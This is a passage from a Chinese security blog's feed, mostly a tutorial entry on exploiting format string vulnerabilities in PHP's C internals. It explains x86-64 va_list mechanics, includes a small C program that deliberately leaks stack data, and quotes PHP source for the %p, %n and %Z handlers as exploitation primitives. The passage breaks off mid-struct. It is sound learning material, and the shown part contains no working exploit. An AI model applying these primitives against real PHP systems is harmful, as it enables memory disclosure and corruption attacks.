,dbg必须处于运行状态</span><br><span class="line">idc.set_reg_Value(long Value, string Register) # 通过寄存器名获得寄存器值。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;idapython的学习资料推荐&quot;&gt;&lt;a href=&quot;#idapython的学习资料推荐&quot; class=&quot;headerlink&quot; title=&quot;idapython的学习资料推荐&quot;&gt;&lt;/a&gt;idapython的学习资料推荐&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;《ida权威指南第二版》&lt;/li&gt;
&lt;li&gt;[&lt;a href=&quot;https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.html]&lt;/a&gt;(&lt;a href=&quot;https://wooyun.js.org/drops/IDAPython&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://wooyun.js.org/drops/IDAPython&lt;/a&gt; 让你的生活更滋润 part1 and part2.html) &lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cartermgj.github.io/2017/10/10/ida-python/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://cartermgj.github.io/2017/10/10/ida-python/&lt;/a&gt; &lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="pwn" scheme="http://blog.wonderkun.cc/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>php pwn学习入门二 (格式化字符串漏洞)</title>
    <link href="http://blog.wonderkun.cc/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/"/>
    <id>http://blog.wonderkun.cc/2020/05/13/php pwn学习入门二/</id>
    <published>2020-05-13T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.718Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php-pwn学习入门二-格式化字符串漏洞"><a href="#php-pwn学习入门二-格式化字符串漏洞" class="headerlink" title="php pwn学习入门二 (格式化字符串漏洞)"></a>php pwn学习入门二 (格式化字符串漏洞)</h2><p>本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。</p><a id="more"></a><h3 id="从可变参函数谈起"><a href="#从可变参函数谈起" class="headerlink" title="从可变参函数谈起"></a>从可变参函数谈起</h3><p>学习c标准库中类似于<code>printf</code>这类函数的格式化字符串漏洞时，我就存在一些疑问：</p><ul><li><ol><li>为什么使用多个%p或者%x泄露的是栈上的数据？这是<code>printf</code>函数实现上的问题吗，可变参数都存储在什么位置？</li></ol></li><li><ol start="2"><li>这存在越界读取数据的行为到底是<code>printf</code>函数的问题，还是可变参函数的通病？</li></ol></li></ul><p>为了搞清楚上述的两个问题，需要先搞明白可变参函数的实现原理，首先自己写一个可变参函数，调试一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对编译器中实现的几个宏进行注释说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_start</span><span class="params">( va_list arg_ptr, prev_param )</span></span>; <span class="comment">//初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数</span></span><br><span class="line"><span class="function">type <span class="title">va_arg</span><span class="params">( va_list arg_ptr, type )</span></span>;  <span class="comment">//该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型，若函数有多个可变参数，则依次调用va_arg宏获取各个变参</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_end</span><span class="params">( va_list arg_ptr )</span></span>; <span class="comment">// 将指针pArgs置为无效，结束变参的获取</span></span><br></pre></td></tr></table></figure><p>其中 <code>va_list</code>结构体在64位上大概长这个样子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> gp_offset;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span>  fp_offset;</span><br><span class="line">   <span class="keyword">void</span> *  overflow_arg_area ;</span><br><span class="line">   <span class="keyword">void</span> * reg_save_area; </span><br><span class="line">&#125; va_list_entry ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  va_list_entry[<span class="number">0</span>] va_list;</span><br></pre></td></tr></table></figure><p>对上述的sum函数进行反编译：</p><p><img src="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png" alt="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png"></p><!-- ![http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png](http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png) --><p>当 <code>ap[0].gp_offset &lt;= 0x2F</code>时 ， <code>v1</code>的取值是 <code>ap[0].reg_save_area + ap[0].gp_offset</code> ,当 <code>ap[0].gp_offset &gt; 0x2F</code>时，<code>v1</code>的取值是 <code>v1 = ap[0].overflow_arg_area;</code>。</p><p>为了搞清楚，<code>va_list_entry</code>每个字段的含义，需要先来看一下<code>ap</code>的初始化过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 0F0h</span><br><span class="line">mov     [rbp+n], edi</span><br><span class="line">mov     [rbp+var_A8], rsi</span><br><span class="line">mov     [rbp+var_A0], rdx</span><br><span class="line">mov     [rbp+var_98], rcx</span><br><span class="line">mov     [rbp+var_90], r8</span><br><span class="line">mov     [rbp+var_88], r9</span><br><span class="line"></span><br><span class="line">mov     [rbp+ap.gp_offset], 8</span><br><span class="line">mov     [rbp+ap.fp_offset], 30h ; &#39;0&#39;</span><br><span class="line">lea     rax, [rbp+arg_0]</span><br><span class="line">mov     [rbp+ap.overflow_arg_area], rax</span><br><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     [rbp+ap.reg_save_area], rax</span><br></pre></td></tr></table></figure><p>这里可以看到 <code>ap.gp_offset</code>被初始化为8，它表示当前初始化<code>va_list ap</code>的函数中固定参数的个数，<code>ap.gp_offset = 固定参数个数*8</code>,<code>ap.fp_offset</code>这个的含义我还没理解，暂时未知，以后遇到了再加上去。 <code>ap.overflow_arg_area</code>保存的是 <code>rbp+0x10</code>(因为在32位中，这个位置保存的是函数的第一个参数，所以ida习惯性的重命名为<code>rbp+arg_0</code>)。<code>ap.reg_save_area</code>保存的是<code>rbp-0xb0</code>，它加上<code>ap.gp_offset</code>恰好就是函数第一个可变参数<code>rsi</code>保存的位置<code>rbp+var_A8</code>。</p><p>通过上述分析，就明白了64位的可变参函数的工作过程如下：</p><ol><li>首先将rsi,rdx, rcx,r8,r9 这五个用于传参的寄存器在当前栈空间中进行备份。</li><li>初始化结构体<code>ap</code>, <code>ap.reg_save_area</code>保存<code>rsi</code>在栈上备份位置-8的位置，<code>ap.overflow_arg_area</code>保存的是<code>rbp+0x10</code>。</li><li>在使用可变参数时，前五个在当前函数栈帧中找，后续的参数在自己调用者的函数栈帧中找。</li></ol><p>明白了上述的工作过程，就解释了格式化字符串漏洞为啥泄露的是栈上的数据了。由于可变参函数参数个数不确定的特性导致无法合理的控制数据读取的边界，所以即使我们自己编写的可变参函数也可能存在泄露栈数据的问题，就拿上述的<code>sum</code>函数来讲，将代码改成如下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(n,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当输入的n&gt;=6时，就会泄露栈上的信息。</p><h3 id="php中的格式化字符串函数"><a href="#php中的格式化字符串函数" class="headerlink" title="php中的格式化字符串函数"></a>php中的格式化字符串函数</h3><p>php中的格式化字符串函数主要有如下四个：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spprintf zend_spprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strpprintf zend_strpprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vspprintf zend_vspprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vstrpprintf zend_vstrpprintf</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_spprintf</span><span class="params">(<span class="keyword">char</span> **message, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_strpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_vspprintf</span><span class="params">(<span class="keyword">char</span> **pbuf, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_vstrpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span></span><br></pre></td></tr></table></figure><p>这四个函数在<code>format</code>参数被控制的情况下都会产生相似的漏洞，但是需要注意的是这四个函数中有两个<code>zend_vspprintf</code>,<code>zend_vstrpprintf</code>是非可变参函数，如果想要调用这个两个函数，就需要在外层封装一个可变参函数，然后在内部调用这两个函数。这点非常重要，因为牵扯到<code>va_list_entry</code>的初始化的问题，它初始化位置的不同也就意味着之后泄露的栈信息位置的差异(没有理解这句话的在读一遍第一节)。</p><p>这四个函数的<code>format</code>解析都是在函数<code>xbuf_format_converter</code>中完成的， 下面对这个函数中比较关键的几个标志进行说明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main/spprintf.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xbuf_format_converter</span><span class="params">(<span class="keyword">void</span> *xbuf, zend_bool is_char, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) &lt;= <span class="keyword">sizeof</span>(u_wide_int)) &#123;</span><br><span class="line">            ui_num = (u_wide_int)((<span class="keyword">size_t</span>) va_arg(ap, <span class="keyword">char</span> *));</span><br><span class="line">            s = ap_php_conv_p2(ui_num, <span class="number">4</span>, <span class="string">'x'</span>,</span><br><span class="line">                    &amp;num_buf[NUM_BUF_SIZE], &amp;s_len);</span><br><span class="line">            <span class="keyword">if</span> (ui_num != <span class="number">0</span>) &#123;</span><br><span class="line">                *--s = <span class="string">'x'</span>;</span><br><span class="line">                *--s = <span class="string">'0'</span>;</span><br><span class="line">                s_len += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s = <span class="string">"%p"</span>;</span><br><span class="line">            s_len = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pad_char = <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'n'</span>:</span><br><span class="line">        *(va_arg(ap, <span class="keyword">int</span> *)) = is_char? (<span class="keyword">int</span>)((smart_string *)xbuf)-&gt;len : (<span class="keyword">int</span>)ZSTR_LEN(((smart_str *)xbuf)-&gt;s);</span><br><span class="line">        <span class="keyword">goto</span> skip_output;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Always extract the argument as a "char *" pointer. We</span></span><br><span class="line"><span class="comment">        * should be using "void *" but there are still machines</span></span><br><span class="line"><span class="comment">        * that don't understand it.</span></span><br><span class="line"><span class="comment">        * If the pointer size is equal to the size of an unsigned</span></span><br><span class="line"><span class="comment">        * integer we convert the pointer to a hex number, otherwise</span></span><br><span class="line"><span class="comment">        * we print "%p" to indicate that we don't handle "%p".</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Z'</span>: &#123;</span><br><span class="line">        zvp = (zval*) va_arg(ap, zval*); <span class="comment">// 把下一个参数作为zval指针类型</span></span><br><span class="line">        free_zcopy = zend_make_printable_zval(zvp, &amp;zcopy);</span><br><span class="line">        <span class="keyword">if</span> (free_zcopy) &#123;</span><br><span class="line">            zvp = &amp;zcopy;</span><br><span class="line">        &#125;</span><br><span class="line">        s_len = Z_STRLEN_P(zvp);</span><br><span class="line">        s = Z_STRVAL_P(zvp);</span><br><span class="line">        <span class="keyword">if</span> (adjust_precision &amp;&amp; (<span class="keyword">size_t</span>)precision &lt; s_len) &#123;</span><br><span class="line">            s_len = precision;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>%p</code>和<code>%n</code>的实现跟c语言中的<code>printf</code>函数类似，<code>%p</code>将<code>ap</code>下一个偏移位置的数据强制转为16进制字符串，<code>%n</code>是向<code>ap</code>下一个偏移位置写入当前需要打印的字符长度。<code>%Z</code>是它特有的，将<code>ap</code>下一个偏移位置的数据转化为zval指针类型，然后调用<code>zend_make_printable_zval</code>将<code>zval</code>数据类型转化为字符串，跟进一下<code>zend_make_printable_zval</code>函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Zend/zend.c</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">int</span> <span class="title">zend_make_printable_zval</span><span class="params">(zval *expr, zval *expr_copy)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(expr) == IS_STRING) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ZVAL_STR(expr_copy, _zval_get_string_func(expr));</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZEND_API zend_string* ZEND_FASTCALL _zval_get_string_func(zval *op) <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">try_again:</span><br><span class="line"><span class="keyword">switch</span> (Z_TYPE_P(op)) &#123;</span><br><span class="line"><span class="keyword">case</span> IS_UNDEF:</span><br><span class="line"><span class="keyword">case</span> IS_NULL:</span><br><span class="line"><span class="keyword">case</span> IS_FALSE:</span><br><span class="line"><span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line"><span class="keyword">case</span> IS_TRUE:</span><br><span class="line"><span class="keyword">return</span> ZSTR_CHAR(<span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">case</span> IS_RESOURCE: &#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(<span class="string">"Resource id #"</span>) + MAX_LENGTH_OF_LONG];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Resource id #"</span> ZEND_LONG_FMT, (zend_long)Z_RES_HANDLE_P(op));</span><br><span class="line"><span class="keyword">return</span> zend_string_init(buf, len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IS_LONG: &#123;</span><br><span class="line"><span class="keyword">return</span> zend_long_to_str(Z_LVAL_P(op));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IS_DOUBLE: &#123;</span><br><span class="line"><span class="keyword">return</span> zend_strpprintf(<span class="number">0</span>, <span class="string">"%.*G"</span>, (<span class="keyword">int</span>) EG(precision), Z_DVAL_P(op));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IS_ARRAY:</span><br><span class="line">zend_error(E_NOTICE, <span class="string">"Array to string conversion"</span>);</span><br><span class="line"><span class="keyword">return</span> zend_string_init(<span class="string">"Array"</span>, <span class="keyword">sizeof</span>(<span class="string">"Array"</span>)<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">case</span> IS_OBJECT: &#123;</span><br><span class="line">zval tmp;</span><br><span class="line"><span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object) &#123;</span><br><span class="line"><span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line"><span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">zval *z = Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">zend_string *str = zval_get_string(z);</span><br><span class="line">zval_ptr_dtor(z);</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">zval_ptr_dtor(z);</span><br><span class="line">&#125;</span><br><span class="line">zend_error(EG(exception) ? E_ERROR : E_RECOVERABLE_ERROR, <span class="string">"Object of class %s could not be converted to string"</span>, ZSTR_VAL(Z_OBJCE_P(op)-&gt;name));</span><br><span class="line"><span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IS_REFERENCE:</span><br><span class="line">op = Z_REFVAL_P(op);</span><br><span class="line"><span class="keyword">goto</span> try_again;</span><br><span class="line"><span class="keyword">case</span> IS_STRING:</span><br><span class="line"><span class="keyword">return</span> zend_string_copy(Z_STR_P(op));</span><br><span class="line">EMPTY_SWITCH_DEFAULT_CASE()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数 <code>_zval_get_string_func</code> 中可以看到在php中非常熟悉的转换为字符串的问题，例如数组被转化为<code>Array</code>字符串。其中需要关注的是<code>IS_OBJECT</code>时的转换，将宏展开是是下面的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;cast_object ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((*op).value.obj)-&gt;handlers-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">    zval *z = ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">        zend_string *str = zval_get_string(z);</span><br><span class="line">        zval_ptr_dtor(z);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    zval_ptr_dtor(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时需要补充一下php中的一些关键的结构体定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_types.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_4(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line">zend_uchar    const_flags,</span><br><span class="line">zend_uchar    reserved)    <span class="comment">/* call info for EX(This) */</span></span><br><span class="line">&#125; v;</span><br><span class="line"><span class="keyword">uint32_t</span> type_info;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="keyword">uint32_t</span>     cache_slot;           <span class="comment">/* literal cache slot 